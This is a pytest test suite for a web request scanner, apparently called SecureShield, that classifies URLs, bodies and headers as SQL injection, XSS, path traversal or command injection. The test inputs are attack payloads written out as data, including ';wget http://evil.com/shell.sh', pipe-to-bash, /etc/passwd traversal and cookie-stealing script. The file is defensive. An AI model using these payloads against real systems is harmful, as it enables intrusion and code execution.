"""
SecureShield - Test Suite
Run with: pytest tests/
"""

import pytest
from secureshield import scan_url, scan_request, configure, clear_log


# ─── Fixtures ────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def disable_logging():
    """Disable file logging during tests."""
    configure(log_enabled=False)
    yield
    configure(log_enabled=True)


# ─── SQL Injection Tests ──────────────────────────────────────────────────────

class TestSQLInjection:
    def test_or_bypass(self):
        url = "https://example.com/login?user=admin'%20OR%20'1'='1"
        assert scan_url(url) == "SQL Injection"

    def test_union_select(self):
        url = "https://example.com/search?q=1+UNION+SELECT+*+FROM+users"
        assert scan_url(url) == "SQL Injection"

    def test_drop_table(self):
        url = "https://example.com/item?id=1;DROP TABLE users--"
        assert scan_url(url) == "SQL Injection"

    def test_comment_injection(self):
        url = "https://example.com/api?id=1--"
        assert scan_url(url) == "SQL Injection"

    def test_sleep_blind(self):
        url = "https://example.com/api?id=1;WAITFOR DELAY '0:0:5'--"
        assert scan_url(url) == "SQL Injection"

    def test_admin_bypass(self):
        url = "https://example.com/admin?user=admin'--"
        assert scan_url(url) == "SQL Injection"


# ─── XSS Tests ───────────────────────────────────────────────────────────────

class TestXSS:
    def test_script_tag(self):
        url = "https://example.com/search?q=<script>alert(1)</script>"
        assert scan_url(url) == "XSS"

    def test_event_handler(self):
        url = "https://example.com/page?name=<img onload=alert(1)>"
        assert scan_url(url) == "XSS"

    def test_javascript_protocol(self):
        url = "https://example.com/redirect?url=javascript:alert(1)"
        assert scan_url(url) == "XSS"

    def test_encoded_script(self):
        url = "https://example.com/search?q=%3cscript%3ealert(1)"
        assert scan_url(url) == "XSS"

    def test_document_cookie(self):
        url = "https://example.com/page?x=document.cookie"
        assert scan_url(url) == "XSS"


# ─── Path Traversal Tests ────────────────────────────────────────────────────

class TestPathTraversal:
    def test_dotdot_slash(self):
        url = "https://example.com/files?path=../../etc/passwd"
        assert scan_url(url) == "Path Traversal"

    def test_encoded_traversal(self):
        url = "https://example.com/files?path=..%2F..%2Fetc%2Fpasswd"
        assert scan_url(url) == "Path Traversal"

    def test_etc_passwd(self):
        url = "https://example.com/read?file=/etc/passwd"
        assert scan_url(url) == "Path Traversal"

    def test_null_byte(self):
        url = "https://example.com/file?name=shell.php%00.jpg"
        assert scan_url(url) == "Path Traversal"


# ─── Command Injection Tests ──────────────────────────────────────────────────

class TestCommandInjection:
    def test_semicolon_ls(self):
        url = "https://example.com/ping?host=localhost;ls"
        assert scan_url(url) == "Command Injection"

    def test_pipe_bash(self):
        url = "https://example.com/run?cmd=echo+hello|bash"
        assert scan_url(url) == "Command Injection"

    def test_wget(self):
        url = "https://example.com/exec?x=;wget+http://evil.com/shell.sh"
        assert scan_url(url) == "Command Injection"


# ─── Clean URLs ───────────────────────────────────────────────────────────────

class TestCleanURLs:
    def test_normal_search(self):
        url = "https://example.com/search?q=python+tutorial"
        assert scan_url(url) is None

    def test_normal_login(self):
        url = "https://example.com/login?user=johndoe&next=/dashboard"
        assert scan_url(url) is None

    def test_normal_api(self):
        url = "https://api.example.com/v1/users/42"
        assert scan_url(url) is None

    def test_empty_url(self):
        assert scan_url("") is None

    def test_none_url(self):
        assert scan_url(None) is None


# ─── scan_request Tests ───────────────────────────────────────────────────────

class TestScanRequest:
    def test_url_attack(self):
        result = scan_request("GET", "https://example.com?id=1' OR '1'='1")
        assert result == "SQL Injection"

    def test_body_attack(self):
        result = scan_request("POST", "https://example.com/login",
                               body="user=admin'--&pass=x")
        assert result == "SQL Injection"

    def test_header_attack(self):
        result = scan_request("GET", "https://example.com/",
                               headers={"X-Custom": "<script>alert(1)</script>"})
        assert result == "XSS"

    def test_clean_request(self):
        result = scan_request("GET", "https://example.com/home",
                               headers={"Accept": "text/html"},
                               body="name=John&email=john@example.com")
        assert result is None
